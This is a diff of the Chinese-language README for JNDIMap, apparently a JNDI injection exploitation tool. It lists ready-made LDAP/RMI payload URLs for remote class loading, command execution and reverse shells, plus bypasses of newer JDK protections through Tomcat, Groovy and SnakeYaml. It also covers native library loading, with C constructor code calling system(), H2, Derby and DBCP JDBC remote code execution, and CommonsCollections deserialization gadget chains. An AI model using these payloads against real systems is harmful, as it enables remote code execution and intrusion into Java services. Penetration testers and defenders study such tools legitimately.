@@ -14,7 +14,7 @@ JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议, 包含多
 - MLet 探测可用 Class
 - LDAP 反序列化
 
-## Compile
+## Build
 
 目前 Release 版本暂未发布, 推荐手动编译
 
@@ -40,7 +40,7 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpP
 
 `-h`: 显示 Usage 信息
 
-## JNDI URL
+## Feature
 
 注意传入的 Base64 均为 **Base64 URL 编码**, 即把 `+` 和 `/` 替换为 `-` 和 `_`
 
@@ -48,23 +48,40 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpP
 
 对于 RMI 协议, 只需要将 `ldap://127.0.0.1:1389/` 替换为 `rmi://127.0.0.1:1099/` 即可
 
+### Basic
+
+直接通过 JNDI Reference 加载远程 Class
+
+Java 版本需小于 8u121 (RMI 协议) 或 8u191 (LDAP 协议)
+
 ```bash
-# DnsLog
+# 发起 DNS 请求
 ldap://127.0.0.1:1389/Basic/DnsLog/xxx.dnslog.cn
 
 # 命令执行
 ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
 ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
 
-# 从字符串/服务器上的某个路径加载自定义的 Class 字节码
+# 加载自定义 Class 字节码
+
+# URL 传参加载
 ldap://127.0.0.1:1389/Basic/FromCode/<base64-java-bytecode>
+# 从运行 JNDIMap 的服务器上加载字节码
 ldap://127.0.0.1:1389/Basic/FromPath/<base64-path-to-evil-class-file>
 
-# 反弹 Shell (支持 Windows)
+# 原生反弹 Shell (支持 Windows)
 ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
+```
 
-# 以下 Bypass 方式支持 Basic 所有功能
+### Bypass
 
+通过以下方式绕过高版本 JDK 限制, 支持 Basic 所有功能
+
+- Tomcat BeanFactory + ELProcessor (Tomcat 版本需小于 8.5.79)
+- Groovy ClassLoader/Shell
+- SnakeYaml
+
+```bash
 # Tomcat Bypass
 ldap://127.0.0.1:1389/TomcatBypass/Command/open -a Calculator
 
@@ -74,34 +91,106 @@ ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
 
 # SnakeYaml Bypass
 ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
+```
 
-# MLet 探测可用 Gadget
-# 如果 com.example.TestClass 这个类存在, 则 HTTP 服务器会接收到一个 /com/example/TestClass_exists.class 请求
+### MLet
+
+通过 MLet 探测 classpath 中存在的类
+
+如果 `com.example.TestClass` 这个类存在, 则 HTTP 服务器会接收到一个 `/com/example/TestClass_exists.class` 请求
+
+```bash
 ldap://127.0.0.1:1389/MLet/com.example.TestClass
+```
 
-# NativeLibLoader 加载动态链接库
-# 需要通过其它方式在目标机器上写入一个 dll/so/dylib, 然后通过 NativeLibLoader 加载
-# 注意传入的 path 为绝对路径, 且不能包含后缀名
-# 例如: 服务器上存在 /tmp/evil.so, 则 path 为 /tmp/evil
+### NativeLibLoader
+
+通过 NativeLibLoader 加载目标服务器上的动态链接库
+
+需要先提前以其它方式在目标机器上写入一个 dll/so/dylib
+
+注意传入的 path 为绝对路径, 且不能包含后缀名
+
+例如: 服务器上存在 `/tmp/evil.so`, 则 path 为 `/tmp/evil`
+
+```bash
 ldap://127.0.0.1:1389/NativeLibLoader/<base64-path-to-native-library>
+```
 
-# Commons/Tomcat DBCP, Alibaba Druid JDBC RCE
-# 将以下的 Factory 替换为 CommonsDbcp1, CommonsDbcp2, TomcatDbcp1, TomcatDbcp2, Druid 其中之一
+动态链接库源码
 
-# H2 RCE
-# 三种方式: CREATE ALIAS/Groovy/JavaScript (ScriptEngine)
+```c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+__attribute__ ((__constructor__)) void preload (void){
+    system("open -a Calculator");
+}
+```
+
+编译
+
+```bash
+# macOS
+gcc -shared -fPIC exp.c -o exp.dylib
+```
+
+### JDBC RCE
+
+支持 Commons/Tomcat DBCP, Druid JDBC RCE
+
+将以下 URL 中的 Factory 替换为 CommonsDbcp1, CommonsDbcp2, TomcatDbcp1, TomcatDbcp2, Druid 其中之一
+
+#### H2
+
+通过 H2 JDBC URL 的 INIT 参数执行 SQL 语句
+
+三种方式 RCE: CREATE ALIAS/Groovy/JavaScript
+
+```bash
 ldap://127.0.0.1:1389/Factory/H2/Alias/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/Groovy/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/open -a Calculator
+```
 
-# Derby 反序列化 RCE
-# 先创建数据库
+#### Derby
+
+Derby 主从复制反序列化 RCE
+
+```bash
+# 1. 创建数据库
 ldap://127.0.0.1:1389/Factory/Derby/Create/<database>
-# 然后指定 Slave Server 的信息, database 即为上面创建的数据库名称
-ldap://127.0.0.1:1389/Factory/Derby/Slave/<ip>/<port>/<database>
-# JNDIMap 提供了 DerbyServer 类用于快速启动 Derby Server 并发送恶意序列化数据 (见 README 末尾)
 
-# 自定义数据 反序列化
+# 2. 使用 JNDIMap 快速启动恶意 Derby Server
+java -cp JNDIMap.jar map.jndi.server.DerbyServer -g "/CommonsCollectionsK1/Command/open -a Calculator"
+
+# 3. 指定 Slave 信息, database 即为上面创建的数据库名称
+ldap://127.0.0.1:1389/Factory/Derby/Slave/<ip>/<port>/<database>
+```
+
+启动内置的恶意 Derby Server
+
+```bash
+Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>] [-f <file>] [-h]
+```
+
+`-p`: Derby Server 监听端口, 默认为 `4851`
+
+`-g`: 指定 Gadget, 如 `/CommonsCollectionsK1/Command/open -a Calculator` (即下文 `/Deserialize/*` 系列路由)
+
+`-f`: 指定自定义序列化数据文件
+
+`-h`: 显示 Usage 信息
+
+### Deserialize
+
+即 LDAP 反序列化, 不支持 RMI 协议
+
+JNDIMap 内置 CommonsCollections K1-K4 和 CommonsBeanutils1NoCC 利用链, 同时也支持自定义数据反序列化
+
+```bash
+# 自定义数据反序列化
 ldap://127.0.0.1:1389/Deserialize/<base64-serialize-data>
 
 # CommonsCollectionsK1 反序列化 (3.1 + TemplatesImpl), 支持命令执行和反弹 Shell
@@ -124,19 +213,3 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/open -a Calculat
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/ReverseShell/127.0.0.1/4444
 ```
-
-## Server
-
-快速启动 Derby Server, 用于配合 Derby 反序列化 RCE
-
-```bash
-Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>] [-f <file>] [-h]
-```
-
-`-p`: Derby Server 监听端口, 默认为 `4851`
-
-`-g`: 指定 Gadget, 如 `/CommonsCollectionsK1/Command/open -a Calculator` (即上面以 `/Deserialize/` 开头的路由)
-
-`-f`: 指定自定义序列化数据文件
-
-`-h`: 显示 Usage 信息
